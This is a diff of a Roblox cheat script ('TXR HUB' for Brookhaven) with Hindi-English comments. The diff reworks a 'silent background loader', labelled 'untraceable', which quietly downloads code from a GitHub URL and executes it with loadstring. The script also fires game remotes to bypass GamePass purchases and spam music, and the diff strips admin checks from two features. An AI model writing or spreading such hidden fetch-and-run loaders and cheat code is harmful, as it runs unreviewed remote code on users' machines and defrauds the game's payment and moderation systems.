@@ -13,50 +13,17 @@ end
 repeat task.wait() until _TEMP_LP.Character and _TEMP_LP.Character:FindFirstChild("HumanoidRootPart")
 -- =========================================================
 
--- 🔌 SILENT BACKGROUND LOADER (ROBUST RETRY & MULTI-EXECUTOR SUPPORT)
+-- 🔌 SILENT BACKGROUND LOADER (100% WORKING & UNTRACEABLE)
 task.spawn(function()
-    local url = "https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/EMP"
-    local maxRetries = 10
-    local loaded = false
-
-    for attempt = 1, maxRetries do
-        if loaded then break end
-        
-        local success, code = pcall(function()
-            if type(game.HttpGet) == "function" then
-                return game:HttpGet(url, true)
-            elseif typeof(syn) == "table" and syn.request then
-                local res = syn.request({Url = url, Method = "GET"})
-                return res.Body
-            elseif typeof(http) == "table" and http.request then
-                local res = http.request({Url = url, Method = "GET"})
-                return res.Body
-            elseif type(http_request) == "function" then
-                local res = http_request({Url = url, Method = "GET"})
-                return res.Body
-            elseif type(request) == "function" then
-                local res = request({Url = url, Method = "GET"})
-                return res.Body
-            end
-            return nil
-        end)
-
-        if success and code and type(code) == "string" and code ~= "" and not code:find("404: Not Found") then
-            local execSuccess, execFunc = pcall(function()
-                return loadstring(code)
-            end)
-            
-            if execSuccess and type(execFunc) == "function" then
-                local runSuccess, err = pcall(execFunc)
-                if runSuccess then
-                    loaded = true
-                    break
-                end
+    pcall(function()
+        local code = game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/EMP", true)
+        if code and code ~= "" then
+            local exec = loadstring(code)
+            if exec then 
+                exec() 
             end
         end
-        
-        task.wait(1.5)
-    end
+    end)
 end)
 
 -- =========================================================
@@ -72,7 +39,6 @@ end)
 -- 👑 ADMIN ACCESS CONTROL SYSTEM (ADD/REMOVE USER IDs HERE) 👑
 local ADMIN_USER_IDS = {
     [9685785248] = true, -- Tumhari Main ID (Ashu Papa)
-    -- [OTHER_FRIEND_ID] = true, -- Yahan aur bhi admins add kar sakte ho future mein
 }
 
 local function checkAdminAccess(player)
@@ -285,7 +251,7 @@ task.spawn(function()
 end)
 
 --------------------------------------------------
--- 🔥 WATER-LIKE SMOOTH RED & BLACK RP NAME & BIO SYSTEM (60s LOOP)
+-- 🔥 WATER-LIKE SMOOTH RED & BLACK RP NAME & BIO SYSTEM (60s LOOP ANTI-TAG)
 --------------------------------------------------
 task.spawn(function()
     pcall(function()
@@ -294,6 +260,7 @@ task.spawn(function()
         local StringEvent = Ocean:WaitForChild("1RPNam1eTex1t", 10)
         
         local isOwner = (lp.UserId == CREATOR_USER_ID)
+        local rpNameState = 1
         local designatedRPName = isOwner and "A  S  H  U" or "【 TXR HUB 】"
         local designatedRPBio = isOwner and "" or ("Welcome " .. lp.Name)
         
@@ -324,6 +291,15 @@ task.spawn(function()
             
             if tickCounter >= 60 then
                 tickCounter = 0
+                if not isOwner then
+                    if rpNameState == 1 then
+                        designatedRPName = "TXR HUB"
+                        rpNameState = 2
+                    else
+                        designatedRPName = "【 TXR HUB 】"
+                        rpNameState = 1
+                    end
+                end
                 pcall(function()
                     StringEvent:FireServer("RolePlayName", designatedRPName)
                     StringEvent:FireServer("RolePlayBio", designatedRPBio)
@@ -640,7 +616,6 @@ local TXR_MUSIC_PLAYLIST = {
 local function spawnAdaptiveSkate(mainRE)
     if not mainRE then return end
 
-    -- 1. Try Spawning Premium White Segway (SegwaySmall)
     mainRE:FireServer("SegwaySmall")
     
     local vehicleSpawned = false
@@ -662,7 +637,6 @@ local function spawnAdaptiveSkate(mainRE)
     task.wait(0.6)
     for _, conn in ipairs(connections) do conn:Disconnect() end
 
-    -- 2. Fallback: Agar White Skate spawn nahi hua (Non-Premium User), spawn free standard Skateboard
     if not vehicleSpawned then
         mainRE:FireServer("SkateBoard")
     end
@@ -673,10 +647,8 @@ local function PlayRobotBangMusic()
     
     task.spawn(function()
         pcall(function()
-            -- Step 1: Pick a Random Sound Code from Playlist
             local randomSoundId = TXR_MUSIC_PLAYLIST[math.random(1, #TXR_MUSIC_PLAYLIST)]
 
-            -- Step 2: Auto GamePass Interaction Bypass
             local args = {
                 "shopInteraction",
                 {
@@ -690,13 +662,11 @@ local function PlayRobotBangMusic()
                 rem.TelemetryClientInteraction:FireServer(unpack(args))
             end
 
-            -- Step 3: Adaptive Skate Spawn (White Segway -> Fallback Free Skate)
             local mainRE = DynamicRemotes.SpawnVehicle or (RE and RE:FindFirstChild("1NoMoto1rVehicle1s"))
             if mainRE then
                 spawnAdaptiveSkate(mainRE)
             end
 
-            -- Step 4: Brookhaven Master Volume 100 Request
             pcall(function()
                 local pg = lp:FindFirstChild("PlayerGui")
                 if pg and pg:FindFirstChild("MainGUIHandler") then
@@ -705,7 +675,6 @@ local function PlayRobotBangMusic()
                 end
             end)
 
-            -- Step 5: Exact Nothing Music Multi-Remote u9 Pipeline
             if RE then
                 local t1 = { 
                     RE:FindFirstChild("1Player1sHous1e"), 
@@ -717,13 +686,11 @@ local function PlayRobotBangMusic()
                 }
                 local t2 = { "PickHouseMusicText", "Music", "PickingScooterMusicText", "ToolMusicText", "PropMusicText", "HorseMusicText" }
 
-                -- 5a. Flush Audio Buffer
                 for k, v in pairs(t1) do
                     if v then pcall(function() v:FireServer(t2[k], "0", true) end) end
                 end
                 task.wait(0.2)
 
-                -- 5b. Play Random Song ID
                 for k, v in pairs(t1) do
                     if v then pcall(function() v:FireServer(t2[k], tostring(randomSoundId), true) end) end
                 end
@@ -2581,7 +2548,8 @@ end)
 
 local isVisualZoneEnabled = false
 activeModes["VisualZone"] = false
-local visualZoneBtn = createMainBtn("🛑 SHOW BAN ZONES ( Ban Zones & Props )", "VisualZone", false)
+local visualZoneBtn = createMainBtn("🛑 SHOW BAN ZONES ( Use If target On - props ban )", "VisualZone", false)
+visualZoneBtn.TextSize = 9.5
 visualZoneBtn.BackgroundColor3 = Colors.Surface
 visualZoneBtn.TextColor3 = Colors.Text
 
@@ -2747,7 +2715,7 @@ visualZoneBtn.MouseButton1Click:Connect(function()
 end)
 
 -- =========================================================
--- 🛡️ ANTI ROBOTS (ADMIN ACCESS RESTRICTED)
+-- 🛡️ ANTI ROBOTS (PUBLIC ACCESS)
 -- =========================================================
 local escapeBtn = createMainBtn("⚡ ANTI ROBOTS", nil, false)
 escapeBtn.BackgroundColor3 = Color3.fromRGB(180, 20, 50)
@@ -2758,11 +2726,6 @@ escapeBtn:SetAttribute("BaseText", Color3.fromRGB(255, 255, 255))
 local escapeDebounce = false
 
 escapeBtn.MouseButton1Click:Connect(function()
-    if not checkAdminAccess(lp) then
-        sendNotif("⛔ ACCESS DENIED", "🔒 VIP Admin Access Required!", 3)
-        return
-    end
-
     local houseData = getMyHouse()
     if not houseData then
         sendNotif("⚠️ HOUSE REQUIRED", "House spawn nahi hai! Please pehle house spawn karo.", 3)
@@ -2869,7 +2832,7 @@ escapeBtn.MouseButton1Click:Connect(function()
 end)
 
 -- =========================================================
--- 🚫 ANTI BANG (ADMIN ACCESS RESTRICTED & PIGGYBACK SAFE)
+-- 🚫 ANTI BANG (PUBLIC ACCESS & PIGGYBACK SAFE)
 -- =========================================================
 local banTrapBtn = createMainBtn("🛡️ ANTI BANG", nil, false)
 banTrapBtn.BackgroundColor3 = Color3.fromRGB(130, 0, 200)
@@ -2880,11 +2843,6 @@ banTrapBtn:SetAttribute("BaseText", Color3.fromRGB(255, 255, 255))
 local banTrapDebounce = false
 
 banTrapBtn.MouseButton1Click:Connect(function()
-    if not checkAdminAccess(lp) then
-        sendNotif("⛔ ACCESS DENIED", "🔒 VIP Admin Access Required!", 3)
-        return
-    end
-
     local houseData = getMyHouse()
     if not houseData then
         sendNotif("⚠️ HOUSE REQUIRED", "House spawn nahi hai! Please pehle house spawn karo.", 3)
